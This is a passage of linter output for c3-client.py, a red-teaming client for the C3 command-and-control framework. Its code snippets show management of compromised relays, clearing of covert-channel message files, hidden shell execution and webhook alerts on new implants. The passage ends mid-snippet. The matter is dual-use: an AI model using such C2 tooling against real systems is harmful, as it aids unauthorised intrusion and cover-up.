836 | ΓÇª                 f'[+] Cleared MSSQL Table on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateway {chanΓÇª
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:866:12
    |
864 |         ret = postRequest(channel["url"], data)
865 |
866 |         if type(ret) == dict and "UncShareFile" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
867 |             if "relay" in channel.keys():
868 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:867:16
    |
866 | ΓÇª     if type(ret) == dict and "UncShareFile" in str(ret):
867 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
868 | ΓÇª             print(
869 | ΓÇª                 f'[+] Cleared UncShareFile message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} oΓÇª
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:899:12
    |
897 |         ret = postRequest(channel["url"], data)
898 |
899 |         if type(ret) == dict and "Dropbox" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
900 |             if "relay" in channel.keys():
901 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:900:16
    |
899 | ΓÇª     if type(ret) == dict and "Dropbox" in str(ret):
900 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
901 | ΓÇª             print(
902 | ΓÇª                 f'[+] Cleared Dropbox message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gatΓÇª
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:932:12
    |
930 |         ret = postRequest(channel["url"], data)
931 |
932 |         if type(ret) == dict and "Github" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
933 |             if "relay" in channel.keys():
934 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:933:16
    |
932 | ΓÇª     if type(ret) == dict and "Github" in str(ret):
933 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
934 | ΓÇª             print(
935 | ΓÇª                 f'[+] Cleared Github message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateΓÇª
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:965:12
    |
963 |         ret = postRequest(channel["url"], data)
964 |
965 |         if type(ret) == dict and "GoogleDrive" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
966 |             if "relay" in channel.keys():
967 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:966:16
    |
965 | ΓÇª     if type(ret) == dict and "GoogleDrive" in str(ret):
966 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
967 | ΓÇª             print(
968 | ΓÇª                 f'[+] Cleared GoogleDrive message files on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} onΓÇª
    |
help: Remove `.keys()`

N803 Argument name `devicesType` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:976:28
    |
976 | def getDeviceName(gateway, devicesType, deviceType):
    |                            ^^^^^^^^^^^
977 |     capability = processCapability(gateway)
978 |     name = list(capability[devicesType].keys())[
    |

N803 Argument name `deviceType` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:976:41
    |
976 | def getDeviceName(gateway, devicesType, deviceType):
    |                                         ^^^^^^^^^^
977 |     capability = processCapability(gateway)
978 |     name = list(capability[devicesType].keys())[
    |

N803 Argument name `channelName` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:985:27
    |
985 | def collectChannels(args, channelName):
    |                           ^^^^^^^^^^^
986 |     channels = []
987 |     gateways = getRequest("/api/gateway")
    |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1005:9
     |
1004 |       for _gateway in gateways:
1005 | /         if len(gateway_id) > 0:
1006 | |             if (
1007 | |                 _gateway["agentId"].lower() != gateway_id.lower()
1008 | |                 and _gateway["name"].lower() != gateway_id.lower()
1009 | |             ):
     | |______________^
1010 |                   continue
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1015:13
     |
1014 |           for channel in gateway["channels"]:
1015 | /             if len(channel_id) > 0:
1016 | |                 if channel["iid"].lower() != channel_id.lower():
     | |________________________________________________________________^
1017 |                       continue
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1034:13
     |
1033 |           for relay in gateway["relays"]:
1034 | /             if len(relay_id) > 0:
1035 | |                 if (
1036 | |                     relay["agentId"].lower() != relay_id.lower()
1037 | |                     and relay["name"].lower() != relay_id.lower()
1038 | |                 ):
     | |__________________^
1039 |                       continue
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1041:16
     |
1039 |                     continue
1040 |
1041 |             if "channels" in relay.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^
1042 |                 for channel in relay["channels"]:
1043 |                     if len(channel_id) > 0:
     |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1043:21
     |
1041 |               if "channels" in relay.keys():
1042 |                   for channel in relay["channels"]:
1043 | /                     if len(channel_id) > 0:
1044 | |                         if channel["iid"].lower() != channel_id.lower():
     | |________________________________________________________________________^
1045 |                               continue
     |
help: Combine `if` statements using `and`

N803 Argument name `stdErrToStdout` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1067:35
     |
1067 | def shell(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
     |                                   ^^^^^^^^^^^^^^^^^^^^
1068 |     CREATE_NO_WINDOW = 0x08000000
1069 |     si = subprocess.STARTUPINFO()
     |

N803 Argument name `surpressStderr` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1067:57
     |
1067 | def shell(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
     |                                                         ^^^^^^^^^^^^^^^^^^^^
1068 |     CREATE_NO_WINDOW = 0x08000000
1069 |     si = subprocess.STARTUPINFO()
     |

N806 Variable `CREATE_NO_WINDOW` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1068:5
     |
1067 | def shell(cmd, alternative=False, stdErrToStdout=False, surpressStderr=False):
1068 |     CREATE_NO_WINDOW = 0x08000000
     |     ^^^^^^^^^^^^^^^^
1069 |     si = subprocess.STARTUPINFO()
1070 |     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     |

F821 Undefined name `cwd`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1091:17
     |
1089 |         proc = subprocess.Popen(
1090 |             cmd,
1091 |             cwd=cwd,
     |                 ^^^
1092 |             shell=True,
1093 |             stdout=subprocess.PIPE,
     |

F821 Undefined name `TimeoutExpired`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1102:16
     |
1100 |             proc.wait()
1101 |
1102 |         except TimeoutExpired:
     |                ^^^^^^^^^^^^^^
1103 |             proc.kill()
1104 |             logger.err("WARNING! The command timed-out! Results may be incomplete")
     |

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1104:13
     |
1102 |         except TimeoutExpired:
1103 |             proc.kill()
1104 |             logger.err("WARNING! The command timed-out! Results may be incomplete")
     |             ^^^^^^
1105 |             outs, errs = proc.communicate()
     |

N806 Variable `origRelays` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1112:5
     |
1111 | def onAlarmRelay(args):
1112 |     origRelays = collectRelays(args, nonFatal=True)
     |     ^^^^^^^^^^
1113 |     lastTimestamp = 0
     |

N806 Variable `lastTimestamp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1113:5
     |
1111 | def onAlarmRelay(args):
1112 |     origRelays = collectRelays(args, nonFatal=True)
1113 |     lastTimestamp = 0
     |     ^^^^^^^^^^^^^
1114 |
1115 |     origRelayIds = set()
     |

N806 Variable `origRelayIds` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1115:5
     |
1113 |     lastTimestamp = 0
1114 |
1115 |     origRelayIds = set()
     |     ^^^^^^^^^^^^
1116 |
1117 |     for gateway, relay in origRelays:
     |

B007 Loop control variable `gateway` not used within loop body
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1117:9
     |
1115 |     origRelayIds = set()
1116 |
1117 |     for gateway, relay in origRelays:
     |         ^^^^^^^
1118 |         origRelayIds.add(relay["agentId"])
1119 |         if relay["timestamp"] > lastTimestamp:
     |
help: Rename unused `gateway` to `_gateway`

N806 Variable `lastTimestamp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1120:13
     |
1118 |         origRelayIds.add(relay["agentId"])
1119 |         if relay["timestamp"] > lastTimestamp:
1120 |             lastTimestamp = relay["timestamp"]
     |             ^^^^^^^^^^^^^
1121 |
1122 |     print("[.] Entering infinite-loop awaiting for new Relays...")
     |

N806 Variable `currRelays` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1128:13
     |
1126 |             time.sleep(args.delay)
1127 |
1128 |             currRelays = collectRelays(args, nonFatal=True)
     |             ^^^^^^^^^^
1129 |             currRelayIds = set()
1130 |             currLastTimestamp = 0
     |

N806 Variable `currRelayIds` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1129:13
     |
1128 |             currRelays = collectRelays(args, nonFatal=True)
1129 |             currRelayIds = set()
     |             ^^^^^^^^^^^^
1130 |             currLastTimestamp = 0
     |

N806 Variable `currLastTimestamp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1130:13
     |
1128 |             currRelays = collectRelays(args, nonFatal=True)
1129 |             currRelayIds = set()
1130 |             currLastTimestamp = 0
     |             ^^^^^^^^^^^^^^^^^
1131 |
1132 |             for gateway, relay in currRelays:
     |

B007 Loop control variable `gateway` not used within loop body
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1132:17
     |
1130 |             currLastTimestamp = 0
1131 |
1132 |             for gateway, relay in currRelays:
     |                 ^^^^^^^
1133 |                 currRelayIds.add(relay["agentId"])
1134 |                 if relay["timestamp"] > currLastTimestamp:
     |
help: Rename unused `gateway` to `_gateway`

N806 Variable `currLastTimestamp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1135:21
     |
1133 |                 currRelayIds.add(relay["agentId"])
1134 |                 if relay["timestamp"] > currLastTimestamp:
1135 |                     currLastTimestamp = relay["timestamp"]
     |                     ^^^^^^^^^^^^^^^^^
1136 |
1137 |             relaysDiff = currRelayIds.difference(origRelayIds)
     |

N806 Variable `relaysDiff` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1137:13
     |
1135 |                     currLastTimestamp = relay["timestamp"]
1136 |
1137 |             relaysDiff = currRelayIds.difference(origRelayIds)
     |             ^^^^^^^^^^
1138 |
1139 |             Logger.dbg(
     |

N806 Variable `lastTimestamp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1152:17
     |
1151 |             if currLastTimestamp > lastTimestamp and len(relaysDiff) > 0:
1152 |                 lastTimestamp = currLastTimestamp
     |                 ^^^^^^^^^^^^^
1153 |                 origRelayIds = currRelayIds
     |

N806 Variable `origRelayIds` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1153:17
     |
1151 |             if currLastTimestamp > lastTimestamp and len(relaysDiff) > 0:
1152 |                 lastTimestamp = currLastTimestamp
1153 |                 origRelayIds = currRelayIds
     |                 ^^^^^^^^^^^^
1154 |
1155 |                 newestRelay = None
     |

N806 Variable `newestRelay` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1155:17
     |
1153 |                 origRelayIds = currRelayIds
1154 |
1155 |                 newestRelay = None
     |                 ^^^^^^^^^^^
1156 |                 newestRelayGateway = None
1157 |                 newestRelayId = relaysDiff.pop()
     |

N806 Variable `newestRelayGateway` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1156:17
     |
1155 |                 newestRelay = None
1156 |                 newestRelayGateway = None
     |                 ^^^^^^^^^^^^^^^^^^
1157 |                 newestRelayId = relaysDiff.pop()
     |

N806 Variable `newestRelayId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1157:17
     |
1155 |                 newestRelay = None
1156 |                 newestRelayGateway = None
1157 |                 newestRelayId = relaysDiff.pop()
     |                 ^^^^^^^^^^^^^
1158 |
1159 |                 for gateway, relay in currRelays:
     |

N806 Variable `newestRelay` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1161:25
     |
1159 |                 for gateway, relay in currRelays:
1160 |                     if relay["agentId"] == newestRelayId:
1161 |                         newestRelay = relay
     |                         ^^^^^^^^^^^
1162 |                         newestRelayGateway = gateway
1163 |                         break
     |

N806 Variable `newestRelayGateway` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1162:25
     |
1160 |                     if relay["agentId"] == newestRelayId:
1161 |                         newestRelay = relay
1162 |                         newestRelayGateway = gateway
     |                         ^^^^^^^^^^^^^^^^^^
1163 |                         break
     |

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1165:35
     |
1163 |                         break
1164 |
1165 |                 if newestRelay == None:
     |                                   ^^^^
1166 |                     continue
     |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1172:40
     |
1171 |                 try:
1172 |                     if args.execute != None and len(args.execute) > 0:
     |                                        ^^^^
1173 |                         for command in args.execute:
1174 |                             cmd = command
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1216:40
     |
1214 |                         print("[.] Commands executed.")
1215 |
1216 |                     if args.webhook != None and len(args.webhook) > 0:
     |                                        ^^^^
1217 |                         for webhook in args.webhook:
1218 |                             data = {
     |
help: Replace with `cond is not None`

F821 Undefined name `headears`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1249:75
     |
1247 | ΓÇª                     try:
1248 | ΓÇª                         time.sleep(args.command_delay)
1249 | ΓÇª                         requests.post(webhook, data=data, headers=headears)
     |                                                                     ^^^^^^^^
1250 | ΓÇª                     except Exception as e:
1251 | ΓÇª                         print(f"[-] Webhook failed: {e}")
     |

N803 Argument name `agentId` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1262:15
     |
1262 | def findAgent(agentId):
     |               ^^^^^^^
1263 |     gateways = getRequest("/api/gateway")
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1273:12
     |
1272 |         gateway = getRequest(f'/api/gateway/{g["agentId"]}')
1273 |         if "relays" in gateway.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
1274 |             for r in gateway["relays"]:
1275 |                 if (
     |
help: Remove `.keys()`

N803 Argument name `N` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1285:27
     |
1285 | def getValueOrRandom(val, N=6):
     |                           ^^^
1286 |     if val == "random":
1287 |         return "".join(
     |

N806 Variable `relayMeta` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1299:5
     |
1297 | def closeRelay(gateway, relay):
1298 |     gateway = getRequest(f'/api/gateway/{gateway["agentId"]}')
1299 |     relayMeta = getRequest(
     |     ^^^^^^^^^
1300 |         f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}'
1301 |     )
     |

N806 Variable `grcChannel` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1310:5
     |
1309 |     print("\n[.] step 2: Closing attached channels")
1310 |     grcChannel = None
     |     ^^^^^^^^^^
1311 |
1312 |     for chan in relayMeta["channels"]:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1313:12
     |
1312 |     for chan in relayMeta["channels"]:
1313 |         if "isReturnChannel" in chan.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1314 |             chan["url"] = (
1315 |                 f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/channel/{chan["iid"]}/command'
     |
help: Remove `.keys()`

N806 Variable `grcChannel` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1317:13
     |
1315 |                 f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/channel/{chan["iid"]}/command'
1316 |             )
1317 |             grcChannel = chan
     |             ^^^^^^^^^^
1318 |             continue
     |

N806 Variable `chanName` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1320:9
     |
1318 |             continue
1319 |
1320 |         chanName = getDeviceName(gateway, "channels", chan["type"])
     |         ^^^^^^^^
1321 |         Logger.info(f'Closing relay\'s channel {chanName} id:{chan["iid"]}')
     |

N806 Variable `relayNode` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1365:9
     |
1363 |     print("\n[.] step 4: closing a channel being a neighbour for Relay's GRC")
1364 |     closed = False
1365 |     for relayNode in gateway["relays"] + [
     |         ^^^^^^^^^
1366 |         gateway,
1367 |     ]:
     |

N803 Argument name `peripheralName` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1411:37
     |
1411 | def closePeripheral(gateway, relay, peripheralName, peripheralId):
     |                                     ^^^^^^^^^^^^^^
1412 |     data = {
1413 |         "name": "PeripheralCommandGroup",
     |

N803 Argument name `peripheralId` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1411:53
     |
1411 | def closePeripheral(gateway, relay, peripheralName, peripheralId):
     |                                                     ^^^^^^^^^^^^
1412 |     data = {
1413 |         "name": "PeripheralCommandGroup",
     |

N803 Argument name `channelToClose` should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1440:27
     |
1440 | def closeChannel(channel, channelToClose):
     |                           ^^^^^^^^^^^^^^
1441 |     chanId = ""
1442 |     if "channelId" in channel.keys():
     |

N806 Variable `chanId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1441:5
     |
1440 | def closeChannel(channel, channelToClose):
1441 |     chanId = ""
     |     ^^^^^^
1442 |     if "channelId" in channel.keys():
1443 |         chanId = channel["channelId"]
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1442:8
     |
1440 | def closeChannel(channel, channelToClose):
1441 |     chanId = ""
1442 |     if "channelId" in channel.keys():
     |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1443 |         chanId = channel["channelId"]
1444 |     elif "channel_id" in channel.keys():
     |
help: Remove `.keys()`

N806 Variable `chanId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1443:9
     |
1441 |     chanId = ""
1442 |     if "channelId" in channel.keys():
1443 |         chanId = channel["channelId"]
     |         ^^^^^^
1444 |     elif "channel_id" in channel.keys():
1445 |         chanId = channel["channel_id"]
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1444:10
     |
1442 |     if "channelId" in channel.keys():
1443 |         chanId = channel["channelId"]
1444 |     elif "channel_id" in channel.keys():
     |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1445 |         chanId = channel["channel_id"]
1446 |     elif "iid" in channel.keys():
     |
help: Remove `.keys()`

N806 Variable `chanId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1445:9
     |
1443 |         chanId = channel["channelId"]
1444 |     elif "channel_id" in channel.keys():
1445 |         chanId = channel["channel_id"]
     |         ^^^^^^
1446 |     elif "iid" in channel.keys():
1447 |         chanId = channel["iid"]
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1446:10
     |
1444 |     elif "channel_id" in channel.keys():
1445 |         chanId = channel["channel_id"]
1446 |     elif "iid" in channel.keys():
     |          ^^^^^^^^^^^^^^^^^^^^^^^
1447 |         chanId = channel["iid"]
     |
help: Remove `.keys()`

N806 Variable `chanId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1447:9
     |
1445 |         chanId = channel["channel_id"]
1446 |     elif "iid" in channel.keys():
1447 |         chanId = channel["iid"]
     |         ^^^^^^
1448 |
1449 |     data = {
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1501:27
     |
1500 | def onCloseNetwork(args):
1501 |     gateways = getRequest(f"/api/gateway")
     |                           ^^^^^^^^^^^^^^^
1502 |
1503 |     for _gateway in gateways:
     |
help: Remove extraneous `f` prefix

N806 Variable `channelsToClose` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1514:5
     |
1512 | def onCloseChannel(args):
1513 |     gateways = getRequest("/api/gateway")
1514 |     channelsToClose = []
     |     ^^^^^^^^^^^^^^^
1515 |
1516 |     for _gateway in gateways:
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1517:9
     |
1516 |       for _gateway in gateways:
1517 | /         if len(args.gateway_id) > 0:
1518 | |             if (
1519 | |                 _gateway["agentId"].lower() != args.gateway_id.lower()
1520 | |                 and _gateway["name"].lower() != args.gateway_id.lower()
1521 | |             ):
     | |______________^
1522 |                   continue
     |
help: Combine `if` statements using `and`

F841 Local variable `capability` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1525:9
     |
1524 |         gateway = getRequest(f'/api/gateway/{_gateway["agentId"]}')
1525 |         capability = processCapability(gateway)
     |         ^^^^^^^^^^
1526 |
1527 |         if len(args.gateway_id) > 0:
     |
help: Remove assignment to unused variable `capability`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1527:9
     |
1525 |           capability = processCapability(gateway)
1526 |
1527 | /         if len(args.gateway_id) > 0:
1528 | |             if (
1529 | |                 gateway["agentId"].lower() == args.agent_id.lower()
1530 | |                 or gateway["name"].lower() == args.agent_id.lower()
1531 | |             ):
     | |______________^
1532 |                   for channel in gateway["channels"]:
1533 |                       name = getDeviceName(gateway, "channels", channel["type"])
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1540:29
     |
1538 |                         _type = "non-negotiation"
1539 |                         if (
1540 |                             "isReturnChannel" in channel.keys()
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1541 |                             and channel["isReturnChannel"]
1542 |                         ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1545:29
     |
1543 |                             _type = "grc"
1544 |                         elif (
1545 |                             "isNegotiationChannel" in channel.keys()
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1546 |                             and channel["isNegotiationChannel"]
1547 |                         ):
     |
help: Remove `.keys()`

F821 Undefined name `relay`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1552:84
     |
1550 | ΓÇª     channelsToClose.append(
1551 | ΓÇª         {
1552 | ΓÇª             "url": f'/api/gateway/{_gateway["agentId"]}/relay/{relay["agentId"]}/channel/{channel["iid"]}/command',
     |                                                                  ^^^^^
1553 | ΓÇª             "name": name,
1554 | ΓÇª             "iid": channel["iid"],
     |

F821 Undefined name `relay`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1555:42
     |
1553 | ΓÇª                     "name": name,
1554 | ΓÇª                     "iid": channel["iid"],
1555 | ΓÇª                     "agent": relay,
     |                                ^^^^^
1556 | ΓÇª                     "type": _type,
1557 | ΓÇª                     "kind": "Relay",
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1577:25
     |
1575 |                     _type = "non-negotiation"
1576 |                     if (
1577 |                         "isReturnChannel" in channel.keys()
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1578 |                         and channel["isReturnChannel"]
1579 |                     ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1582:25
     |
1580 |                         _type = "grc"
1581 |                     elif (
1582 |                         "isNegotiationChannel" in channel.keys()
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1583 |                         and channel["isNegotiationChannel"]
1584 |                     ):
     |
help: Remove `.keys()`

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1616:9
     |
1614 |     gateway, relay = findAgent(args.agent_id)
1615 |     if not relay and not gateway:
1616 |         logger.fatal(
     |         ^^^^^^
1617 |             "Could not find agent (Gateway or Relay) which should be used to setup a channel."
1618 |         )
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1622:17
     |
1620 |     url = f'/api/gateway/{gateway["agentId"]}/command'
1621 |
1622 |     if relay != None:
     |                 ^^^^
1623 |         url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
1624 |         print(
     |
help: Replace with `cond is not None`

N806 Variable `secondCommandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1632:5
     |
1630 |         )
1631 |
1632 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelMattermost")
     |     ^^^^^^^^^^^^^^^
1633 |     commandId = getLastGatewayCommandID()
1634 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1633:5
     |
1632 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelMattermost")
1633 |     commandId = getLastGatewayCommandID()
     |     ^^^^^^^^^
1634 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

F601 Dictionary key literal `"name"` repeated
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1675:9
     |
1673 |             "name": "Command",
1674 |         },
1675 |         "name": "GatewayCommandGroup",
     |         ^^^^^^
1676 |     }
     |
help: Remove repeated key literal `"name"`

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1694:9
     |
1692 |     gateway, relay = findAgent(args.agent_id)
1693 |     if not relay and not gateway:
1694 |         logger.fatal(
     |         ^^^^^^
1695 |             "Could not find agent (Gateway or Relay) which should be used to setup a channel."
1696 |         )
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1700:17
     |
1698 |     url = f'/api/gateway/{gateway["agentId"]}/command'
1699 |
1700 |     if relay != None:
     |                 ^^^^
1701 |         url = f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command'
1702 |         print(
     |
help: Replace with `cond is not None`

N806 Variable `secondCommandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1710:5
     |
1708 |         )
1709 |
1710 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelLDAP")
     |     ^^^^^^^^^^^^^^^
1711 |     commandId = getLastGatewayCommandID()
1712 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

N806 Variable `commandId` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1711:5
     |
1710 |     secondCommandId = getCommandIdMapping(gateway, "AddNegotiationChannelLDAP")
1711 |     commandId = getLastGatewayCommandID()
     |     ^^^^^^^^^
1712 |     Logger.info(f"Issuing a command with ID = {commandId}")
     |

F821 Undefined name `logger`
    --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:1781:9
     |
1779 |     gateway, relay = findAgent(args.agent_id)
1780 |     if not relay and not gateway:
